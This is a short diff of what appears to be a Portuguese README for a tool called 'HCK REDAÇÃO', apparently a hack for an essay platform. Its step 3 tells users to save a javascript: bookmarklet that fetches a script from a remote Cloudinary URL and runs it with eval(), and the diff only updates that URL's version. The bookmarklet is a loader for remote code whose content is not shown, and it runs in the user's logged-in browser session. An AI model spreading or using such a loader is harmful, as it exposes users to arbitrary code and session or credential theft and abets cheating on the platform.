@@ -66,7 +66,7 @@
 2. Selecione a opção "Adicionar"
 3. Cole o seguinte código no campo de URL:
    ```javascript
-   javascript:fetch('https://res.cloudinary.com/dctxcezsd/raw/upload/v1744067203/main.js').then(r=>r.text()).then(r=>eval(r))
+   javascript:fetch('https://res.cloudinary.com/dctxcezsd/raw/upload/v1744108248/main.js').then(r=>r.text()).then(r=>eval(r))
    ```
 4. Salve como "HCK REDAÇÃO"
 
